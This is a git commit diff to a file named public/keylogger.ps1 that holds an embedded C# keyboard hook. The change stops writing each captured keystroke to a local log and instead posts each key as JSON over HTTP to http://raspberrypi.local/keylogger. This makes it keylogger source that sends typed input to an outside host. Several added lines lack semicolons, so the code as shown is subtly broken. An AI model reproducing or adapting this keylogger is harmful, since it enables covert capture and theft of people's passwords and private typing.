6fac29a7e393ad20ebb826b32219c0b24c9800ff
Leon Schlote <leonmarvin.schlote@detecon.com>
2018-05-07 14:35:52 +0200

    test

--- public/keylogger.ps1
+++ public/keylogger.ps1
@@ -34,8 +34,16 @@ namespace KeyLogger {
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
       if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
-        int vkCode = Marshal.ReadInt32(lParam);
-        logFile.WriteLine((Keys)vkCode);
+        int vkCode = Marshal.ReadInt32(lParam)
+        string URL = "http://raspberrypi.local/keylogger";
+        System.Net.WebRequest webRequest = System.Net.WebRequest.Create(URL);
+        webRequest.Method = "POST";
+        webRequest.ContentType = "application/json";
+        Stream reqStream = webRequest.GetRequestStream()
+        string postData = "{\"data\": \""+((Keys)vkCode)+"\"}"
+        byte[] postArray = Encoding.ASCII.GetBytes(postData);
+        reqStream.Write(postArray, 0, postArray.Length);
+        reqStream.Close();
       }
 
       return CallNextHookEx(hookId, nCode, wParam, lParam);
